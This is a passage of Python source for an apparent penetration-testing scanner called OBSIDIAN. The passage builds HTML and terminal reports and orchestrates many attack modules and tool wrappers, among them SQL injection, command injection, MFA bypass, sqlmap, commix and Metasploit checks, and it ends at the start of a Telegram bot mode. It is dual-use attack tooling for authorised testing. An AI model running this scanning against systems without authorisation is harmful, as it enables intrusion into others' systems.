                   "#e65100" if cvss_s and float(str(cvss_s) or 0)>=7 else
                   "#f57f17" if cvss_s and float(str(cvss_s) or 0)>=4 else "#2e7d32")
        cvss_badge =(f'<span style="background:{cvss_bg};color:#fff;padding:1px 7px;border-radius:3px;font-size:.72rem;font-weight:bold;margin-left:4px">CVSS {cvss_s}</span>' if cvss_s else "")
        owasp_badge=(f'<span style="background:#1a237e;color:#fff;padding:1px 6px;border-radius:3px;font-size:.7rem;margin-left:6px">{f.owasp_id} {f.owasp_name}</span>' if f.owasp_id else "")
        mitre_badge=(f'<span style="background:#b71c1c;color:#fff;padding:1px 6px;border-radius:3px;font-size:.7rem;margin-left:4px">{f.mitre_id}</span>' if f.mitre_id else "")
        pl=(f'<tr><td>Payload</td><td><code>{f.payload}</code></td></tr>' if f.payload else "")
        rows+=(f'<div class="card" style="border-left:5px solid {SC.get(f.severity,"#555")}">'
               f'<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px">'
               f'<div><h3 style="margin:0;color:#e0e0e0;font-size:.95rem">{f.title}</h3>'
               f'<div style="margin-top:4px">{cvss_badge}{owasp_badge}{mitre_badge}</div></div>'
               f'{badge(f.severity)}</div>'
               f'<table class="dt">'
               f'<tr><td>Module</td><td>{f.module}</td></tr>'
               f'<tr><td>Tool</td><td>{f.tool}</td></tr>'
               f'{"<tr><td>CVSS</td><td>"+str(cvss_s)+" — "+getattr(f,chr(99)+chr(118)+chr(115)+chr(115)+"_vector","")+"</td></tr>" if cvss_s else ""}'
               f'{"<tr><td>CWE</td><td>"+f.cwe+"</td></tr>" if f.cwe else ""}'
               f'{"<tr><td>Confidence</td><td>"+f.confidence+"</td></tr>" if hasattr(f,"confidence") and f.confidence else ""}'
               f'<tr><td>Description</td><td>{f.description}</td></tr>'
               f'{pl}'
               f'<tr><td>URL</td><td><a href="{f.url}">{f.url[:80]}</a></td></tr>'
               f'<tr><td style="color:#2ecc71">Fix</td><td>{f.recommendation}</td></tr>'
               f'</table></div>')

    rc="#e74c3c" if risk>70 else "#e67e22" if risk>40 else "#2ecc71"
    # OWASP breakdown
    owasp_groups={}
    for f in store.all():
        if f.owasp_id: owasp_groups.setdefault(f.owasp_id,(f.owasp_name,0)); owasp_groups[f.owasp_id]=(f.owasp_name,owasp_groups[f.owasp_id][1]+1)
    # Separate web and API OWASP groups
    web_groups = {k:v for k,v in owasp_groups.items() if not k.startswith("API")}
    api_groups = {k:v for k,v in owasp_groups.items() if k.startswith("API")}
    max_cnt = max((v[1] for v in owasp_groups.values()), default=1)
    def owasp_bar_html(groups, color):
        return "".join(
            f'<div style="display:flex;align-items:center;gap:6px;margin-bottom:3px">'
            f'<span style="width:42px;font-size:.72rem;color:{color};font-weight:bold">{oid}</span>'
            f'<div style="background:#1a1a1a;flex:1;border-radius:3px;overflow:hidden;height:14px">'
            f'<div style="background:{color};opacity:.8;height:100%;width:{min(cnt/max_cnt*100,100):.0f}%;min-width:4px"></div></div>'
            f'<span style="font-size:.72rem;color:#ccc;min-width:18px;text-align:right">{cnt}</span>'
            f'<span style="font-size:.7rem;color:#666;flex:2;white-space:nowrap;overflow:hidden">{oname[:28]}</span></div>'
            for oid,(oname,cnt) in sorted(groups.items()))
    owasp_bars    = owasp_bar_html(web_groups, "#9b59b6")
    owasp_api_bars= owasp_bar_html(api_groups, "#1abc9c")
    # MITRE ATT&CK groups
    mitre_groups = {}
    for f in store.all():
        if f.mitre_id:
            key = f.mitre_id
            mitre_groups.setdefault(key,(f.mitre_technique,0))
            mitre_groups[key] = (f.mitre_technique, mitre_groups[key][1]+1)
    mitre_bars = "".join(
        f'<div style="display:flex;align-items:center;gap:6px;margin-bottom:3px">'
        f'<span style="width:80px;font-size:.7rem;color:#e67e22;font-weight:bold">{mid}</span>'
        f'<div style="background:#1a1a1a;flex:1;border-radius:3px;overflow:hidden;height:12px">'
        f'<div style="background:#e67e22;opacity:.7;height:100%;width:{min(cnt/max_cnt*100,100):.0f}%;min-width:4px"></div></div>'
        f'<span style="font-size:.7rem;color:#ccc;min-width:16px;text-align:right">{cnt}</span>'
        f'<span style="font-size:.68rem;color:#666;flex:3;white-space:nowrap;overflow:hidden">{mtech[:30]}</span></div>'
        for mid,(mtech,cnt) in sorted(mitre_groups.items(), key=lambda x:-x[1][1])[:15])

    gauge_js=f"""const c=document.getElementById('g');if(c){{const x=c.getContext('2d');
x.beginPath();x.arc(100,100,80,Math.PI,2*Math.PI);x.strokeStyle='#1a1a1a';x.lineWidth=20;x.stroke();
x.beginPath();x.arc(100,100,80,Math.PI,Math.PI+(Math.PI*{risk/100}));
x.strokeStyle='{rc}';x.lineWidth=20;x.stroke();
x.fillStyle='{rc}';x.font='bold 24px Courier New';x.textAlign='center';x.fillText('{risk}%',100,108);
x.fillStyle='#888';x.font='11px Courier New';x.fillText('Risk',100,128);}}"""

    html=f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>OBSIDIAN v10 — {target}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Courier New',monospace;background:#0a0a0a;color:#ccc;padding:20px}}
h1{{color:#9b59b6;text-align:center;font-size:1.8rem;text-shadow:0 0 20px #9b59b6;margin-bottom:4px}}
.sub{{text-align:center;color:#555;margin-bottom:18px;font-size:.8rem}}
.top{{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap;align-items:flex-start}}
.gauge{{text-align:center;flex:0 0 200px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px;flex:1}}
.stat{{background:#111;border:1px solid #222;padding:12px;text-align:center;border-radius:5px}}
.stat-n{{font-size:1.7rem;font-weight:bold}}
.owasp{{background:#0d0d1a;border:1px solid #222;padding:12px;border-radius:5px;flex:0 0 260px}}
.owasp-title{{font-size:.8rem;color:#9b59b6;margin-bottom:8px;font-weight:bold}}
.bar{{display:flex;gap:5px;margin-bottom:14px;flex-wrap:wrap}}
.bs{{flex:1;min-width:65px;padding:7px;text-align:center;font-weight:bold;border-radius:4px;font-size:.75rem}}
.filter{{margin-bottom:12px;display:flex;gap:5px;flex-wrap:wrap}}
.fb{{padding:4px 10px;border:1px solid #333;background:#111;color:#ccc;cursor:pointer;border-radius:4px;font-size:.75rem}}
.fb:hover,.fb.active{{background:#9b59b6;border-color:#9b59b6;color:#fff}}
.card{{background:#111;border-radius:5px;padding:14px;margin-bottom:10px;border:1px solid #1e1e1e;transition:border .2s}}
.card:hover{{border-color:#9b59b6}}
.dt{{width:100%;border-collapse:collapse;margin-top:8px;font-size:.8rem}}
.dt td{{padding:4px 8px;border-bottom:1px solid #1a1a1a;vertical-align:top}}
.dt td:first-child{{width:95px;color:#666;font-weight:bold;white-space:nowrap}}
a{{color:#9b59b6}}code{{background:#1a1a1a;padding:1px 4px;border-radius:3px;font-size:.74rem;word-break:break-all}}
footer{{text-align:center;margin-top:24px;color:#333;font-size:.68rem;padding-top:10px;border-top:1px solid #1a1a1a}}
</style></head>
<body>
<h1>☠ OBSIDIAN v4.0 ☠</h1>
<p class="sub">{target} &nbsp;|&nbsp; {meta['start'][:19].replace('T',' ')} &nbsp;|&nbsp; OWASP Top 10 | MITRE ATT&CK</p>

<div class="top">
  <div class="gauge"><canvas id="g" width="200" height="140"></canvas></div>
  <div class="stats">
    <div class="stat"><div style="color:#555;font-size:.68rem">DURATION</div><div class="stat-n" style="color:#555;font-size:1.1rem">{meta['duration']}s</div></div>
    <div class="stat"><div style="color:#555;font-size:.68rem">TOTAL</div><div class="stat-n" style="color:#9b59b6">{len(store.all())}</div></div>
    <div class="stat"><div style="color:#e74c3c;font-size:.68rem">CRITICAL</div><div class="stat-n" style="color:#e74c3c">{counts['Critical']}</div></div>
    <div class="stat"><div style="color:#e67e22;font-size:.68rem">HIGH</div><div class="stat-n" style="color:#e67e22">{counts['High']}</div></div>
    <div class="stat"><div style="color:#f1c40f;font-size:.68rem">MEDIUM</div><div class="stat-n" style="color:#f1c40f">{counts['Medium']}</div></div>
    <div class="stat"><div style="color:#2ecc71;font-size:.68rem">LOW</div><div class="stat-n" style="color:#2ecc71">{counts['Low']}</div></div>
  </div>
  <div class="owasp">
    <div class="owasp-title" style="color:#9b59b6">OWASP Web Top 10</div>
    {owasp_bars if owasp_bars else '<span style="color:#555;font-size:.72rem">—</span>'}
    {'<div style="margin-top:8px"><div class="owasp-title" style="color:#1abc9c">OWASP API Top 10</div>' + owasp_api_bars + '</div>' if owasp_api_bars else ''}
    {'<div style="margin-top:8px"><div class="owasp-title" style="color:#e67e22">MITRE ATT&amp;CK</div>' + mitre_bars + '</div>' if mitre_bars else ''}
  </div>
</div>

<div class="bar">
  <div class="bs" style="background:#e74c3c;color:#fff">CRIT: {counts['Critical']}</div>
  <div class="bs" style="background:#e67e22;color:#fff">HIGH: {counts['High']}</div>
  <div class="bs" style="background:#f1c40f;color:#000">MED: {counts['Medium']}</div>
  <div class="bs" style="background:#2ecc71;color:#000">LOW: {counts['Low']}</div>
  <div class="bs" style="background:#9b59b6;color:#fff">INFO: {counts['Info']}</div>
</div>

<div class="filter">
  <button class="fb active" onclick="filterCards('all',this)">All</button>
  <button class="fb" onclick="filterCards('Critical',this)">Critical</button>
  <button class="fb" onclick="filterCards('High',this)">High</button>
  <button class="fb" onclick="filterCards('Medium',this)">Medium</button>
  <button class="fb" onclick="filterCards('A01',this)">A01 Access</button>
  <button class="fb" onclick="filterCards('A03',this)">A03 Injection</button>
  <button class="fb" onclick="filterCards('A07',this)">A07 Auth</button>
  <button class="fb" onclick="filterCards('T1190',this)">T1190</button>
  <button class="fb" onclick="filterCards('T1552',this)">T1552</button>
</div>

<div id="cards">
{rows if rows else '<p style="text-align:center;color:#333;padding:40px">No significant findings.</p>'}
</div>

<footer>OBSIDIAN v{VERSION} | OWASP Top 10 2021 | MITRE ATT&CK | Authorized Testing Only</footer>
<script>
{gauge_js}
function filterCards(sev,btn){{
  document.querySelectorAll('.fb').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.card').forEach(c=>{{
    c.style.display=(sev==='all'||c.textContent.includes(sev))?'block':'none';
  }});
}}
</script></body></html>"""
    with open(path,"w",encoding="utf-8") as fh: fh.write(html)
    logger.log("REPORT",f"HTML → {path}","SUCCESS"); return path

# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY DISPLAY
# ─────────────────────────────────────────────────────────────────────────────
def print_final_summary(store, files, duration):
    counts = store.counts(); risk = store.risk_score()
    print(); menu_divider("═", C.PUR)
    print(f"\n  {C.PUR}{C.BLD}☠  OBSIDIAN v{VERSION} SCAN COMPLETE  ☠{C.RST}\n")
    menu_divider("─", C.DIM)

    # Risk bar
    bar_w = 44; filled = int(bar_w * risk / 100)
    col = C.RED if risk > 70 else C.YLW if risk > 40 else C.GRN
    print(f"\n  {C.WHT}Risk Score  {C.RST}"
          f"[{col}{'█'*filled}{C.DIM}{'░'*(bar_w-filled)}{C.RST}]"
          f" {col}{C.BLD}{risk}%{C.RST}\n")

    # Severity table
    for label, count, color in [
        ("Critical", counts["Critical"], C.RED),
        ("High",     counts["High"],     C.RED),
        ("Medium",   counts["Medium"],   C.YLW),
        ("Low",      counts["Low"],      C.GRN),
        ("Info",     counts["Info"],     C.PUR),
    ]:
        bf = min(count, 35)
        print(f"  {color}{label:<12}{C.RST} {count:>6}  "
              f"{color}{'■'*bf}{C.RST}{'·'*max(0,35-bf)}")

    # OWASP Web Top 10
    owasp_counts = {}
    for f in store.all():
        if f.owasp_id:
            owasp_counts[f.owasp_id] = owasp_counts.get(f.owasp_id, 0) + 1

    if owasp_counts:
        web_ids = sorted(k for k in owasp_counts if not k.startswith("API"))
        api_ids = sorted(k for k in owasp_counts if k.startswith("API"))
        print()
        if web_ids:
            print(f"  {C.PUR}{C.BLD}OWASP Web Top 10:{C.RST}")
            for oid in web_ids:
                cnt = owasp_counts[oid]
                bar = C.PUR + "■" * min(cnt, 25) + C.RST
                print(f"    {C.PUR}{oid:<6}{C.RST} {bar} {cnt}")
        if api_ids:
            print(f"  {C.CYN}{C.BLD}OWASP API Top 10:{C.RST}")
            for oid in api_ids:
                cnt = owasp_counts[oid]
                bar = C.CYN + "■" * min(cnt, 25) + C.RST
                print(f"    {C.CYN}{oid:<7}{C.RST} {bar} {cnt}")

    # MITRE ATT&CK
    mitre_counts = {}
    for f in store.all():
        if f.mitre_id:
            mitre_counts[f.mitre_id] = (
                f.mitre_technique,
                mitre_counts.get(f.mitre_id, ("",0))[1] + 1
            )
    if mitre_counts:
        print()
        print(f"  {C.YLW}{C.BLD}MITRE ATT&CK Techniques ({len(mitre_counts)} unique):{C.RST}")
        for mid, (tech, cnt) in sorted(mitre_counts.items(), key=lambda x:-x[1][1])[:10]:
            bar = C.YLW + "■" * min(cnt, 20) + C.RST
            print(f"    {C.YLW}{mid:<14}{C.RST} {bar} {cnt:>3}  {C.DIM}{tech[:32]}{C.RST}")

    print(); menu_divider("─", C.DIM)
    print(f"  {C.WHT}Duration        : {C.GRN}{duration}s{C.RST}")
    print(f"  {C.WHT}Total Findings  : {C.GRN}{C.BLD}{len(store.all())}{C.RST}")
    print(f"  {C.WHT}Modules Run     : {C.GRN}100+ internal | 40+ tool wrappers{C.RST}")
    print(f"  {C.WHT}OWASP Coverage  : {C.GRN}Web A01-A10 + API1-API10 (2023){C.RST}")
    print(f"  {C.WHT}MITRE Covered   : {C.GRN}{len(mitre_counts)} ATT&CK techniques{C.RST}")
    print()
    for f in files:
        low = f.lower()
        if   low.endswith(".sarif.json"): ext, icon = "SARIF", "📄"
        elif low.endswith(".json"):       ext, icon = "JSON", "📄"
        elif low.endswith(".html"):       ext, icon = "HTML", "🌐"
        elif low.endswith(".csv"):        ext, icon = "CSV", "📊"
        elif low.endswith(".md"):         ext, icon = "MARKDOWN", "📝"
        else:                             ext, icon = "REPORT", "📄"
        print(f"  {C.GRN}✔{C.RST}  {icon} {C.WHT}{ext}{C.RST} → {C.PUR}{C.UND}{f}{C.RST}")
    print(); menu_divider("═", C.PUR)
    print(f"\n  {C.DIM}{random.choice(QUOTES)}{C.RST}\n")


def run_scan(target, proxy=None, output="report.json", html=False,
             skip_crawl=False, auto_install=True, threads=THREADS,
             min_severity=None, cookies=None, headers_extra=None,
             verbose=False, resume=False, output_format="json",
             nmap_mode="full", nuclei_templates=None):
    """
    Main scan orchestrator — v6.0.
    min_severity: filter findings below this level
    cookies:      dict or string of cookies for authenticated scanning
    headers_extra: dict of custom headers (e.g. Authorization)
    verbose:      show raw HTTP in terminal
    resume:       load checkpoint and skip completed phases
    output_format: json|html|csv|sarif|markdown|all
    """
    if not target.startswith(("http://","https://")): target="https://"+target
    target=target.rstrip("/")
    WORK_DIR.mkdir(exist_ok=True); TOOLS_DIR.mkdir(exist_ok=True)
    # ── Setup verbose logging
    global _verbose_logger
    _verbose_logger = VerboseLogger(active=verbose)

    session  = make_session(proxy)
    store    = FindingStore()
    domain   = get_domain(target)
    start_dt = datetime.now()

    # ── Inject custom cookies into session ────────────────────────────────────
    if cookies:
        if isinstance(cookies, str):
            for part in cookies.split(";"):
                part = part.strip()
                if "=" in part:
                    k, _, v = part.partition("=")
                    session.cookies.set(k.strip(), v.strip())
        elif isinstance(cookies, dict):
            for k, v in cookies.items():
                session.cookies.set(k, v)
        logger.log("AUTH", "Custom cookies injected for authenticated scanning", "SUCCESS")

    # ── Inject custom headers ─────────────────────────────────────────────────
    if headers_extra:
        if isinstance(headers_extra, dict):
            session.headers.update(headers_extra)
        elif isinstance(headers_extra, list):
            for hdr in headers_extra:
                if ":" in hdr:
                    k, _, v = hdr.partition(":")
                    session.headers[k.strip()] = v.strip()
        logger.log("AUTH", "Custom headers injected", "SUCCESS")

    # ── Checkpoint / resume ───────────────────────────────────────────────────
    checkpoint = ScanCheckpoint(target, WORK_DIR) if resume else None

    # ── Initialise shared scan context (FP reduction, baseline cache, rate ctrl)
    global _scan_ctx
    _scan_ctx = ScanContext(target, session)

    # ── Pre-flight: warm baseline cache for target ────────────────────────────
    logger.log("INIT", "Warming baseline cache …")
    _scan_ctx.baseline(target)  # cache now, used by all modules

    # ── Wildcard DNS detection ────────────────────────────────────────────────
    import hashlib as _hx
    wc_probe = f"http://{_hx.md5(str(time.time()).encode()).hexdigest()[:12]}.{domain}"
    try:
        import requests as _rq_wc
        wc_r = _rq_wc.get(wc_probe, timeout=5, verify=False,
                           headers={"User-Agent": DEFAULT_UA})
        if wc_r.status_code == 200:
            _wc_hash = _hx.sha1(wc_r.text.encode(errors="ignore")).hexdigest()
            _scan_ctx.set_wildcard_hash(_wc_hash)
            logger.log("INIT", f"Wildcard DNS detected for *.{domain} — skipping subdomain brute", "WARNING")
    except Exception:
        pass

    def phase(name, color=C.PUR):
        print(); pulse_line(f"☠  {name}  ☠", color); print()

    # ── Phase 1: Passive ──────────────────────────────────────────────────────
    phase("PHASE 1 — PASSIVE FINGERPRINTING  [A05/A02/A06/A08]")
    for fn in [lambda:module_recon(target,session),
               lambda:module_tech_deep(target,session),        # v6.0 deep fingerprint
               lambda:module_security_headers(target,session),
               lambda:module_ssl(target),
               lambda:module_hsts_check(target,session),
               lambda:module_weak_crypto(target,session),
               lambda:module_cookies(target,session),
               lambda:module_waf_detect(target,session),
               lambda:module_outdated_components(target,session),
               lambda:module_subresource_integrity(target,session),
               lambda:module_method_override(target,session)]:
        store.extend(fn())
    # Banner grabbing (runs in background — doesn't block web modules)
    store.extend(module_banner_grab(target))        # v6.0 CVE cross-ref
    store.extend(module_whois_asn(target, session)) # v7.0 WHOIS+ASN+cloud
    store.extend(module_git_history(target, session))# v7.0 git history leak

    # ── Phase 2: Policy ────────────────────────────────────────────────────────
    phase("PHASE 2 — POLICY & LOGIC  [A01/A03/A05/A07]")
    policy_fns=[
        lambda:module_cors(target,session),
        lambda:module_csrf(target,session),
        lambda:module_clickjacking(target,session),
        lambda:module_http_methods(target,session),
        lambda:module_host_header(target,session),
        lambda:module_open_redirect(target,session),
        lambda:module_crlf(target,session),
        lambda:module_403_bypass(target,session),
        lambda:module_hpp(target,session),
        lambda:module_cache_poisoning(target,session),
        lambda:module_rate_limiting(target,session),
        lambda:module_logging_monitoring(target,session),
        lambda:module_cors_preflight(target,session),
        lambda:module_http_smuggling(target,session),
        lambda:module_http_desync(target,session),
        lambda:module_regex_dos(target,session),
    ]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for r in ex.map(lambda f:f(),policy_fns): store.extend(r)

    # ── Phase 3: Exposure ──────────────────────────────────────────────────────
    phase("PHASE 3 — EXPOSURE & DISCLOSURE  [A02/A05/A08]")
    store.extend(module_sensitive_files(target,session))
    store.extend(module_info_disclosure(target,session))
    store.extend(module_secrets(target,session))
    store.extend(module_xxe(target,session))
    store.extend(module_graphql(target,session))
    store.extend(module_jwt(target,session))
    store.extend(module_oauth_oidc(target,session))
    store.extend(module_spf_dmarc(target,session))
    # v6.0 additions
    store.extend(module_smtp_relay(target,session))     # SMTP open relay test
    store.extend(module_dns_zone_transfer(target,session))  # AXFR test
    store.extend(module_blind_xss(target,session))      # OOB blind XSS
    store.extend(module_wsdl_soap(target,session))
    store.extend(module_deserialization(target,session))
    store.extend(module_s3_bucket(target,session))
    store.extend(module_cloud_metadata_deep(target,session))
    store.extend(module_api_versioning(target,session))
    store.extend(module_error_fingerprint(target,session))
    store.extend(module_websocket(target,session))
    store.extend(module_subresource_integrity(target,session))
    store.extend(module_broken_link_hijacking(target,session))
    store.extend(module_api8_misconfig(target,session))
    # Certificate transparency — also returns subdomains
    ct_result = module_cert_transparency(target,session)
    if isinstance(ct_result, tuple):
        store.extend(ct_result[0])
        all_ct_subs = ct_result[1]
    else:
        store.extend(ct_result)
        all_ct_subs = []

    # ── Phase 4: Auth & Session ────────────────────────────────────────────────
    phase("PHASE 4 — AUTH & SESSION + NEW VECTORS  [A07/A03/A08]")
    auth_fns=[
        lambda:module_default_creds(target,session),
        lambda:module_session_fixation(target,session),
        lambda:module_jwt_confusion(target,session),
        lambda:module_saml_issues(target,session),
        lambda:module_account_enumeration(target,session),
        lambda:module_password_policy(target,session),
        lambda:module_timing_attack(target,session),
    ]
    with ThreadPoolExecutor(max_workers=3) as ex:
        for r in ex.map(lambda f:f(),auth_fns): store.extend(r)

    store.extend(module_mfa_bypass(target, session))   # v7.0 MFA bypass

    # ── Phase 5: External Recon ────────────────────────────────────────────────
    phase("PHASE 5 — EXTERNAL RECON  [A05]",C.GRN)
    all_subs = []
    # Run subdomain tools in PARALLEL for speed
    logger.log("RECON", "Running subfinder + amass + sublist3r in parallel …")
    with ThreadPoolExecutor(max_workers=3) as _ex:
        sf_fut = _ex.submit(tool_subfinder, domain)
        am_fut = _ex.submit(tool_amass,     domain)
        sl_fut = _ex.submit(tool_sublist3r, domain)
        for fut in [sf_fut, am_fut, sl_fut]:
            try:
                _, subs = fut.result(timeout=360)
                all_subs += subs
            except Exception: pass
    # Merge CT-discovered subdomains
    try: all_subs += all_ct_subs
    except NameError: pass
    all_subs=list(set(all_subs)); logger.log("RECON",f"Total subdomains: {len(all_subs)}","SUCCESS")
    live=[]
    if all_subs:
        resolved=tool_dnsx(all_subs,WORK_DIR)
        live=tool_httpx(resolved or all_subs,WORK_DIR)
        store.extend(module_subdomain_takeover(all_subs,session))
    store.extend(tool_naabu(target)); store.extend(tool_wafw00f(target))
    store.extend(tool_dnsrecon(domain)); store.extend(tool_theHarvester(domain))
    # v6.1: deep nmap with NSE vulnerability scripts
    store.extend(tool_nmap_v8(target, WORK_DIR, nmap_mode))  # v8

    # ── Phase 6: URL Discovery ─────────────────────────────────────────────────
    phase("PHASE 6 — CRAWL & URL DISCOVERY",C.CYN)
    all_urls=[target]
    if not skip_crawl:
        all_urls+=crawl_internal(target,session)
        all_urls+=tool_gau(domain,WORK_DIR)
        all_urls+=tool_waybackurls(domain)
        all_urls+=tool_waymore(domain,WORK_DIR)    # v7.0
        all_urls+=tool_gospider(target,WORK_DIR)
        all_urls+=tool_katana(target,WORK_DIR)
    all_urls+=tool_paramspider(domain,WORK_DIR)
    all_urls=list(dict.fromkeys(u for u in all_urls if u and domain in u))
    logger.log("CRAWLER",f"In-scope URLs: {len(all_urls)}","SUCCESS")
    store.extend(tool_js_analysis(target,session,WORK_DIR))
    store.extend(tool_trufflehog(target))

    # ── Phase 7: Web Scanners ──────────────────────────────────────────────────
    phase("PHASE 7 — WEB SERVER SCANNERS + TOOL ARSENAL",C.YLW)
    store.extend(tool_nikto_v8(target, WORK_DIR)); store.extend(tool_sslscan(target))
    store.extend(tool_masscan(target, WORK_DIR))           # v7.0 masscan
    store.extend(tool_whatweb(target))                    # v7.0
    store.extend(tool_semgrep(target,WORK_DIR,session))   # v8.0 SAST whatweb

    store.extend(tool_sslyze_v8(target, WORK_DIR)); store.extend(tool_wpscan(target))
    store.extend(tool_curl(target, session)); store.extend(tool_testssl(target, WORK_DIR))
    store.extend(tool_dalfox(target,WORK_DIR)); store.extend(tool_sqlmap(target,WORK_DIR))
    store.extend(tool_xsstrike(target)); store.extend(tool_tplmap(target))
    store.extend(tool_commix(target)); store.extend(tool_corscanner(target))
    store.extend(tool_corsy(target)); store.extend(tool_jwt_tool(target,session))
    store.extend(tool_graphqlmap(target)); store.extend(tool_nosqlmap(target))
    store.extend(tool_ssrfmap(target)); store.extend(tool_snallygaster(target))
    with ThreadPoolExecutor(max_workers=4) as ex:
        for r in ex.map(lambda f:f(),[
            lambda:tool_gobuster(target,WORK_DIR),
            lambda:tool_ffuf(target,WORK_DIR),
            lambda:tool_feroxbuster(target,WORK_DIR)]):
            store.extend(r)
    af,_=tool_arjun(target,WORK_DIR); store.extend(af)
    # OOB testing (runs async, results collected after other scans)
    store.extend(module_interactsh_oob(target,session))
    nuc_tgts = list(dict.fromkeys([target]+live))[:40]
    store.extend(tool_nuclei_v8(nuc_tgts, WORK_DIR, nuclei_templates))  # v8
    # v6.1: MSF check-only validation of confirmed CVEs from port findings
    confirmed_cves = list(set(
        f.cwe for f in store.all()
        if f.cwe and f.cwe.startswith("CVE-") and f.severity in ("Critical","High")
    ))
    if confirmed_cves:
        logger.log("MSF-CHECK", f"Validating {len(confirmed_cves)} CVE(s) via MSF check-only …")
        store.extend(tool_msf_check(target, confirmed_cves[:10], WORK_DIR))

    # ── Phase 7.5: API Security Tests  [API1-API10] ────────────────────────
    phase("PHASE 7.5 — OWASP API SECURITY TOP 10",C.CYN)
    api_fns=[
        lambda:module_api_bfla(target,session),
        lambda:module_api_excessive_data(target,session),
        lambda:module_api_versioning(target,session),
        lambda:module_business_logic(target,session),
        lambda:module_api2_broken_auth(target,session),
        lambda:module_api4_resource(target,session),
        lambda:module_api8_misconfig(target,session),
    ]
    with ThreadPoolExecutor(max_workers=3) as ex:
        for r in ex.map(lambda f:f(),api_fns): store.extend(r)

    # ── Phase 8: Injection Tests ───────────────────────────────────────────────
    test_eps=list(dict.fromkeys(u for u in all_urls if "=" in u))[:50]
    phase(f"PHASE 8 — ACTIVE INJECTION + API TESTS  [A01/A03/A10/API1-10]  ({len(test_eps)} endpoints)",C.RED)

    # Additional new modules per-endpoint
    INJ_MODS=[
        module_xss, module_sqli, module_lfi, module_ssti, module_ssrf,
        module_nosqli, module_crlf, module_open_redirect,
        module_idor, module_ldap_injection, module_email_injection,
        module_hpp, module_mass_assignment, module_file_upload,
        module_cache_poisoning, module_rate_limiting,
        module_prototype_pollution, module_xpath_injection,
        module_ssi_injection, module_graphql_injection,
        module_path_traversal, module_type_juggling,
        module_log_injection,
        module_api_bfla, module_api_excessive_data, module_business_logic,
        # v6.0 new modules
        module_rfi, module_blind_cmd_injection, module_xss_advanced,
        module_sqli_advanced, module_webdav, module_verb_tampering,
        # v7.0 new injection + detection modules
        module_xss_v7, module_stored_xss, module_sqli_v7, module_nosqli_v7,
        module_html_injection, module_css_injection, module_formula_injection,
        module_race_condition, module_zip_slip, module_reset_token_entropy,
    ]

    def test_ep(u):
        results=[]
        for m in INJ_MODS: results.extend(m(u,session))
        return results

    done=0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures={ex.submit(test_ep,u):u for u in test_eps}
        for future in as_completed(futures):
            done+=1; progress_bar("Injection Testing",len(test_eps),done,34)
            try: store.extend(future.result())
            except: pass
    if test_eps: print()

    # Reports
    end_dt   = datetime.now()
    duration = round((end_dt - start_dt).total_seconds(), 2)
    meta     = {"start": start_dt.isoformat(), "end": end_dt.isoformat(), "duration": duration}

    # ── Apply min_severity filter ─────────────────────────────────────────────
    SEV_RANK = {"Critical":5,"High":4,"Medium":3,"Low":2,"Info":1,"None":0}
    if min_severity:
        min_rank = SEV_RANK.get(min_severity, 0)
        original_count = len(store.all())
        store._items = [f for f in store._items if SEV_RANK.get(f.severity,0) >= min_rank]
        filtered = original_count - len(store._items)
        if filtered > 0:
            logger.log("FILTER", f"Filtered {filtered} findings below {min_severity}", "INFO")

    # ── Add CVSS scores to all findings ──────────────────────────────────────
    for f in store.all():
        if not getattr(f, 'cvss_score', None):
            cvss_score, cvss_vector, cvss_rating = CVSS31.for_module(f.module)
            f.cvss_score  = cvss_score
            f.cvss_vector = cvss_vector
            f.cvss_rating = cvss_rating

    # ── Save reports in requested format(s) ──────────────────────────────────
    out_files = []
    fmt = output_format if output_format else "json"
    if fmt in ("json","all"):
        out_files.append(save_json_report(target, store, meta, output))
    if fmt in ("html","all") or html:
        hp = output.replace(".json",".html")
        out_files.append(save_html_report(target, store, meta, hp))
    if fmt in ("csv","all"):
        cp = output.replace(".json",".csv")
        out_files.append(save_csv_report(target, store, meta, cp))
    if fmt in ("sarif","all"):
        sp = output.replace(".json",".sarif.json")
        out_files.append(save_sarif_report(target, store, meta, sp))
    if fmt in ("markdown","all"):
        mp = output.replace(".json",".md")
        out_files.append(save_markdown_report(target, store, meta, mp))

    # ── Save checkpoint complete ──────────────────────────────────────────────
    if checkpoint:
        checkpoint.clear()  # Scan complete — remove checkpoint
    print_final_summary(store, out_files, duration)

    # ── Optional AI Advisor post-scan analysis ────────────────────────────────
    if len(store.all()) > 0 and not skip_crawl:
        print()
        try:
            ans = input(f"  {C.PUR}☠ Run AI Advisor on findings? [y/N] :{C.RST} ").strip().lower()
            if ans in ("y","yes"):
                ev  = threading.Event()
                thr = threading.Thread(target=spinner_task,
                                      args=("Claude AI analysing findings …", ev, C.PUR),
                                      daemon=True)
                thr.start()
                analysis = ai_advisor_analyze([f.to_dict() for f in store.all()], target)
                ev.set(); thr.join()
                print(f"  {C.PUR}{'='*60}{C.RST}")
                print(f"  {C.PUR}{C.BLD}☠ AI ADVISOR — PTES ANALYSIS{C.RST}")
                print(f"  {C.PUR}{'='*60}{C.RST}")
                for line in analysis.split('\n'):
                    print(f"  {C.WHT}{line}{C.RST}")
                # Save AI analysis to report
                ai_path = output.replace(".json","_ai_analysis.md")
                with open(ai_path,"w") as af:
                    af.write(f"# AI Advisor Analysis\n\n**Target:** {target}\n\n{analysis}\n")
                print(f"\n  {C.GRN}✔{C.RST} AI analysis saved → {ai_path}")
        except (KeyboardInterrupt, EOFError):
            pass

    return out_files

# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM BOT
# ─────────────────────────────────────────────────────────────────────────────
def telegram_bot_mode():
    clr(); show_banner(); menu_title("🤖  TELEGRAM BOT MODE")
    print(f"  {C.GRN}  /scan URL{C.RST}  — Full OWASP+MITRE scan\n  {C.GRN}  /status  {C.RST}  — Health check\n")
    menu_divider("─",C.DIM)
    token=prompt("  ┗━━ BOT TOKEN :",C.PUR)
    if not token: print(f"\n  {C.RED}✗  No token.{C.RST}\n"); return
    print(f"\n  {C.GRN}✔  Polling ...{C.RST}\n"); offset=0
    while True:
        try:
